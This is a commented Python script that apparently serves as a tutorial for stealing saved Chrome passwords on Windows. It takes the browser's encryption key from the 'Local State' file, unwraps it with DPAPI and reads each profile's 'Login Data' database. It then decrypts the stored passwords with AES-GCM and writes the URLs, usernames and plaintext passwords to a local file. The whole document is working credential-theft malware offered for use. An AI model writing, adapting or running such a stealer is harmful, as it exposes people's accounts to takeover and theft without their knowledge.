# We need:
# os to interact with the operating system
# shutil to quickly copy a file as some files are locked to modifying
# json to read json formatted files
# base64 to decode the encryption key
# re to match our files of interest
# win32crypt to return our encrytion information
# sqlite to read sqlite files
# and aes to decrypt the passwords

import os, shutil, json, base64, re, win32crypt, sqlite3
from Cryptodome.Cipher import AES

# We are going after the current users chrome passwords
current_user = os.path.expanduser("~")
# Save the local state file path to a variable to quickly grab the encryption key
local_state_file_path = os.path.join(current_user, "AppData\\Local\\Google\\Chrome\\User Data\\Local State")
# Save the user data directory to quickly read the contents of that directory
user_data_file_path = os.path.join(current_user, "AppData\\Local\\Google\\Chrome\\User Data")

# Again we are going in reverse order as to call these functions when we need them

# We will make a function to quickly get our encryptions key 
def get_encryption_key():
    # Open the file in read mode
    file = open(local_state_file_path, "r")
    # Save all the content to a variable
    raw_json = file.read()
    # Format the file
    formatted_file = json.loads(raw_json)
    # The file is similar to a dictionary so we can
    # input the os_crypt key and get the value of
    # this section (contains our encryption information)
    encryption_info = formatted_file["os_crypt"]
    # Select the encrypted_key value to get the encrypted key
    encoded_encryption_key = encryption_info["encrypted_key"]
    # The key was encoded in base64, so quickly decode
    decoded_unformatted_key = base64.b64decode(encoded_encryption_key)
    # Bite of the 'DPAPI' at the beginning
    encryption_key = decoded_unformatted_key[5:]
    # Return the encrypted key, and the info associated
    return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]

# Now create a function to decrypt the pass word on the file
def decrypt_password(ciphertext, encryption_key):
    # The encrypted text (ciphertext) contains an 
    # intialization vector used in the decryption
    # of these passwords, so grab this
    intialization_vector = ciphertext[3:15]
    # Now grab the actual encrypted password
    encrypted_password = ciphertext[15:-16]
    # Create a ready to use AES object for decryption
    cipher = AES.new(encryption_key, AES.MODE_GCM, intialization_vector)
    # Decrypt the password
    decrypted_password = cipher.decrypt(encrypted_password)
    # Send the password back
    return decrypted_password

# Now lets get to actually coding
def main():
    # Quickly grab the encryption key for the current user
    encryption_key = get_encryption_key()
    # Locate all profile directories
    # This line says to grab the profile directory IF it says either Profile followed by anything, or says Default
    profiles = [profile for profile in os.listdir(user_data_file_path) if re.search('^Profile.*|^Default$', profile)]
    # Create a new file to save all the passwords to
    saved_passwords = open('passwords', 'a')
    # Set a variable to write all the passwords to
    saved_passwords = ""
    # For every profile directory
    for profile in profiles:
        # Save the Login Data file to a variable
        login_data_path = os.path.join(user_data_file_path, profile, "Login Data")
        # Test if it exists, if it does, copy it to a temp db
        if os.path.exists(login_data_path):
            shutil.copy2(login_data_path, "temporary_database")
        # This database is sqlite formatted, so connect to it    
        sqlite_connetion = sqlite3.connect("temporary_database")
        # Read from it
        selector = sqlite_connetion.cursor()
        # And select all the info you want from it (it is saved to the variable 'selector')
        selector.execute("SELECT action_url, username_value, password_value FROM logins")
        # Save that info to a variable
        raw_info = enumerate(selector.fetchall())
        # Grab each section from the raw info
        # it is formatted like so: [index, ("url", "username", b"encrypted password")]            
        for index, (url, username, encrypted_password) in raw_info:
            # Decrypt the password
            decrypted_password = decrypt_password(encrypted_password, encryption_key)
            # If the decrypted password is empty, do not continue executing
            if not decrypted_password:
                continue
            # Format the info and add it to the variable
            saved_passwords += f'{url}, {username}, {decrypted_password.decode()}{"\n"}'
        # Close the sql object            
        selector.close()
        # Close the sql server connection
        sqlite_connetion.close()
        # Remove the copied temporary database
        os.remove("temporary_database")
        # Open a passwords file and save all of the info to it
        with open("passwords", "w") as file:
            file.write(saved_passwords)
            # Close the file
            file.close()
# If main is in the script, run it
if __name__ == '__main__':
    main()
